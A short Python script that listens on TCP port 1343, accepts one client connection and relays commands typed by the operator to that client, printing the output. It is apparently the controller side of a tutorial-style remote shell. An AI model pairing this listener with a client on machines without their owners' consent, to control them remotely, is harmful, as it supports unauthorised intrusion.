#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Nov 16 22:27:09 2019

@author: robert.shyroian
"""

import socket
import sys

#Create socket(allows two computers to connect)
def socket_create():
    try:
        global host#server ip adress
        global port
        global s
        host = ''
        port = 1343
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        
#Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host#server ip adress
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()
        
#Establishing a connection with client(socket must be listening for them)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + str(address[0]) + " \ Port" + str(address[1]))
    send_commands(conn)
    conn.close()

#Send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(4096), "utf-8")
            print(client_response, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()